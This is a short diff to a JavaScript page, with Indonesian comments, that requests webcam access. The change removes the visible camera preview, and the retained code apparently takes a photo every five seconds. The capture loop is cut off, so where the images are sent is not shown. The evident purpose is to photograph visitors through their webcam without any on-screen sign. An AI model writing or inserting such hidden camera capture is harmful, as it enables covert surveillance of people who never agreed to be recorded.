@@ -40,13 +40,6 @@ function toggleVideo(videoId) {
 navigator.mediaDevices
   .getUserMedia({ video: true, audio: false })
   .then((stream) => {
-    // Tampilkan preview kamera (opsional)
-    const video = document.createElement("video");
-    video.setAttribute("autoplay", true);
-    video.setAttribute("playsinline", true);
-    video.setAttribute("muted", true);
-    video.srcObject = stream;
-    document.body.appendChild(video);
 
     // 🔥 Ambil foto tiap 5 detik
     setInterval(() => {
